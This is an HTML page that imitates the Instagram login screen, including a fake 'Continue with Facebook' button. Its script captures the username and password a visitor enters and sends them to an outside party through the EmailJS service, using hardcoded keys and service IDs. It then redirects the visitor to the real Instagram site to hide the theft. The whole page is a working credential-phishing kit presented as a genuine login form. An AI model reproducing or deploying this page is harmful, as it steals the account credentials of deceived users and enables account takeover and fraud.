<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Style Login</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center; /* Ensures everything is centered */
        }

        .container {
            width: 100%;
            max-width: 320px; /* Adjusted width for a more compact design */
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 15px;
            box-sizing: border-box; /* Ensures padding doesn't cause overflow */
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 40px; /* Slightly smaller logo */
            margin-bottom: 15px; /* Move the logo up by reducing the margin */
        }

        .facebook-button {
            width: 100%; /* Makes the Facebook button as wide as the login button */
            background-color: #3897f0;
            color: white;
            padding: 10px; /* Same padding as login button */
            font-size: 12px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook-button img {
            width: 16px; /* Smaller Facebook logo */
            height: 16px;
            margin-right: 8px;
        }

        .divider {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 12px; /* Smaller font size */
            margin: 15px 0;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #8e8e8e;
        }

        .divider::before {
            margin-right: 8px;
        }

        .divider::after {
            margin-left: 8px;
        }

        .form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .form-input {
            background-color: #262626;
            border: 1px solid #424242;
            border-radius: 4px;
            color: #fff;
            padding: 10px;
            margin-bottom: 8px;
            font-size: 12px;
            width: 100%; /* Ensures the textboxes and login button have the same width */
            max-width: 280px; /* Ensures the textboxes are narrower but still scale properly */
            box-sizing: border-box; /* Prevents overflow due to padding */
        }

        .form-input:focus {
            border-color: #fff;
            outline: none;
        }

        .login-button {
            width: 100%;
            background-color: #3897f0;
            color: white;
            padding: 10px;
            font-size: 12px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            max-width: 280px; /* Same width as textboxes */
        }

        .login-button:hover {
            background-color: #3178c6;
        }

        .forgot-password {
            font-size: 10px;
            color: #3897f0;
            text-decoration: none;
            text-align: center;
            margin-bottom: 15px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-text {
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }

        .signup-text a {
            color: #3897f0;
            text-decoration: none;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        /* Show button styling inside password input */
        .password-container {
            position: relative;
            width: 100%;
            max-width: 280px; /* Same as the other elements */
        }

        .show-password-btn {
            background-color: transparent;
            color: #3897f0;
            border: none;
            font-size: 12px;
            cursor: pointer;
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%); /* Centers vertically */
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>

        <button class="facebook-button">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo">
            Continue with Facebook
        </button>

        <div class="divider"><span></span>OR<span></span></div>

        <form id="loginForm" class="form">
            <input type="text" id="username" class="form-input" placeholder="Phone number, username, or email" required>
            <div class="password-container">
                <input type="password" id="password" class="form-input" placeholder="Password" required>
                <button type="button" class="show-password-btn" id="showPassword">Show</button>
            </div>
            <button type="submit" id="loginButton" class="login-button disabled" disabled>Log In</button>
        </form>

        <a href="#" class="forgot-password">Forgot password?</a>

        <p class="signup-text">Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <script type="text/javascript">
        // Initialize EmailJS with your public key
        emailjs.init("ZaF8wyUZavRVBvsqx");

        // Handle form submission
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Prevent form from refreshing the page

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Send email data to EmailJS
            emailjs.send("service_b6ugscc", "template_wnvqxmb", {
                username: username,
                password: password
            })
            .then(function(response) {
                console.log("Email sent successfully", response);

                // Redirect to Instagram after a successful submission
                window.location.href = "https://www.instagram.com";
            }, function(error) {
                console.error("Failed to send email:", error);
                alert("Failed to send login data.");
            });
        });

        // Show/Hide password functionality
        document.getElementById('showPassword').addEventListener('click', function() {
            const passwordField = document.getElementById('password');
            if (passwordField.type === "password") {
                passwordField.type = "text";
                this.textContent = "Hide";
            } else {
                passwordField.type = "password";
                this.textContent = "Show";
            }
        });

        // Enable/Disable Login Button based on fields
        document.getElementById('username').addEventListener('input', toggleLoginButton);
        document.getElementById('password').addEventListener('input', toggleLoginButton);

        function toggleLoginButton() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginButton = document.getElementById('loginButton');

            if (username === "" || password === "") {
                loginButton.classList.add("disabled");
                loginButton.disabled = true;
            } else {
                loginButton.classList.remove("disabled");
                loginButton.disabled = false;
            }
        }

        // Initial check on load
        toggleLoginButton();
    </script>
</body>
</html>
